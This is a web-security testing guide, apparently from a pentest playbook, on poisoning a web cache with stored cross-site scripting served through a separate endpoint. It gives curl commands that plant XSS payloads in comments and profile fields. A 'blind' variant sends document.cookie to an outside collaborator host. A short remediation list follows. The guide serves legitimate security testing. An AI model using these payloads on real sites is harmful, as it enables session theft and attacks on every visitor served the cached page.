# Poison with Stored Payloads via Separate Endpoint

## Summary
If one endpoint stores attacker-controlled content (comments, profiles, avatars) and another endpoint reflects that content in a cached response, the cache can be poisoned with the stored payload.

## Detection

### Step 1: Identify Stored Content Endpoints
Look for endpoints that accept and store user content:
- Comments or reviews
- User profile fields (bio, display name, website)
- File uploads (avatars, attachments)
- Forum posts
- Shared configuration or templates

### Step 2: Identify Reflection of Stored Content
Find where stored content is reflected:
- Homepage showing latest comments
- Dashboard listing user bios
- Search results page
- Admin moderation panel

### Step 3: Confirm Caching of Reflection Page

```bash
# Check caching headers on the reflection page
curl -sI "https://target.com/" | grep -i "x-cache\|cf-cache\|age"
```

### Step 4: Store the Payload

```bash
# Post a comment with XSS payload
curl -s -X POST "https://target.com/api/comments" \
  -H "Cookie: session=abc123" \
  -d "body=<script>alert(document.cookie)</script>&post_id=123"

# Or update profile bio with payload
curl -s -X PUT "https://target.com/api/profile" \
  -H "Cookie: session=abc123" \
  -d "display_name=<img src=x onerror=alert(1)>"
```

### Step 5: Trigger Cache Poisoning
Access the reflection page to cache the poisoned content:

```bash
# Visit the page that reflects the stored content
curl -s "https://target.com/" > /dev/null

# Now any user visiting the homepage gets the poisoned cache
curl -s "https://target.com/"
```

### Blind Cache Poisoning
If you cannot directly access the cache layer:

```bash
# Use a webhook or collaborator to detect cache hits
PAYLOAD='<script>fetch("https://collaborator.oastify.com/?cookie="+document.cookie)</script>'

# Store the payload
curl -s -X POST "https://target.com/api/comments" \
  -H "Cookie: session=abc123" \
  -d "body=$PAYLOAD&post_id=123"

# Access the reflection page with cache buster
curl -s "https://target.com/?t=$(date +%s)" > /dev/null

# Wait for collaborator callback indicating cache hit
```

## Remediation
- Set Cache-Control: no-store on pages that reflect user-generated content
- Sanitise stored content before storage and before output
- Implement cache key variations based on authentication state
- Use Content Security Policy with strict CSP to prevent script execution
- Apply automatic cache purging when stored content is updated
